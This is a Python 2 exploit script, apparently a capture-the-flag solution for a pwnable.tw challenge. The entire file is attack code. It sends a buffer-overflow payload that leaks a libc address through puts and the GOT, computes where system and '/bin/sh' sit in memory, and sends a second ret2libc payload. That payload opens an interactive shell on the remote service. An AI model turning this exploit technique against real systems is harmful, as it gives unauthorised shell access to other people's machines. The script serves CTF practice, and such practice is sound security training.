from socket import *
from time import *
from struct import *

import telnetlib

ip='chall.pwnable.tw'
port=10103

s=socket(AF_INET,SOCK_STREAM)
s.connect((ip,port))

t=telnetlib.Telnet()
t.sock=s

read_got=0x0804afd0
read_offset=0xd41c0
read_lib=''

system_offset=0x3a940
system_lib=''

binsh_offset=0x158e8c

pppr=0x08048a79
pr=0x08048475

puts_plt=0x080484a8

offset1=read_offset-system_offset

offset2=binsh_offset-read_offset

main_addr=0x08048954
nops=0x90909090

def recv_until(s,c):
        data=''
        while c not in data:
                data+=s.recv(1)
        return data

def p32(x):
        return pack('I',x)

def up32(x):
        return unpack('I',x)[0]

print recv_until(s,':')
s.send('1\n')
print recv_until(s,':')
s.send('A'*44)
raw_input('0')

print recv_until(s,':')
s.send('2\n')
print recv_until(s,':')
s.send('B'*4)
raw_input('1')

print recv_until(s,':')
s.send('2\n')
print recv_until(s,':')

payload="A"*7
payload+=p32(puts_plt)
payload+=p32(pr)
payload+=p32(read_got)
payload+=p32(main_addr)

s.send(payload)
raw_input('2')

print recv_until(s,':')
s.send('3\n')
raw_input('3')

print recv_until(s,':')
s.send('3\n')
raw_input('4')

print recv_until(s,'win !!\n')

read_lib= up32(s.recv(4))


system_lib=read_lib-offset1
puts_lib=read_lib-0x75080
binsh_addr=read_lib+offset2
#######################return main####################################

print recv_until(s,':')
s.send('1\n')
print recv_until(s,':')
s.send('A'*44)
raw_input('0')

print recv_until(s,':')
s.send('2\n')
print recv_until(s,':')
s.send('B'*4)
raw_input('1')

print recv_until(s,':')
s.send('2\n')
print recv_until(s,':')

payload='A'*7
payload+=p32(system_lib)
payload+="\x90\x90\x90\x90"
payload+=p32(binsh_addr)

s.send(payload)

raw_input('2')

print recv_until(s,':')
s.send('3\n')
raw_input('3')

print recv_until(s,':')
s.send('3')

raw_input('4')

print recv_until(s,'win !!\n')

t.interact()

s.close()
